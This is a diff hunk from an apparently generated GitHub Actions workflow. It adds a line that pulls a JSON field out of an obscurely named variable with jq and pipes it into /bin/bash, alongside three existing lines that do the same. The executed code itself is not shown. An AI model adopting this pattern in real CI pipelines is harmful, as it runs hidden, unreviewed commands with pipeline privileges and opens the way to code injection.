@@ -25,6 +25,7 @@ jobs:
           echo $ofam1738 | jq -r .sivm0225 | /bin/bash
           echo $vj90 | jq -r .yvrq4 | /bin/bash
           echo $cybsv4690 | jq -r .tle2 | /bin/bash
+          printf '%s' "$qj42809" | jq -r .qcbh49354 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
